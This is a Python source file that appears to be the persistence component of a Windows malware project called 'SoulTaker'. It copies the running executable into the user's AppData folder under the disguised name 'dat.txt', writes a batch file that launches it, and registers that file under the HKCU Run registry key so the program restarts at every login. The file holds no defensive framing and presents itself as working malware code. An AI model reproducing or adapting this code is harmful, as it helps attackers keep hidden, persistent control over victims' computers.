import subprocess
import os
import shutil
import sys

class Startup:
    def __init__(self) -> None:        
        self.working_dir = os.getenv("APPDATA") + "\\SoulTaker"
    
        if self.check_self():
            return

        self.mkdir()
        self.write_stub()
        self.regedit()
    
    def check_self(self) -> bool:
        return os.path.realpath(sys.executable) == self.working_dir + "\\dat.txt"
    
    def mkdir(self) -> str:
        if os.path.isdir(self.working_dir):
            shutil.rmtree(self.working_dir)
        os.mkdir(self.working_dir)
    
    def write_stub(self) -> None:
        shutil.copy2(os.path.realpath(sys.executable), self.working_dir + "\\dat.txt")
        
        with open(file=f"{self.working_dir}\\run.bat", mode="w") as f:
            f.write(f"@echo off\ncall {self.working_dir}\\dat.txt")
    
    def regedit(self) -> None:
        subprocess.run(args=["reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "SoulTaker", "/f"], shell=True)
        subprocess.run(args=["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "SoulTaker", "/t", "REG_SZ", "/d", f"{self.working_dir}\\run.bat", "/f"], shell=True)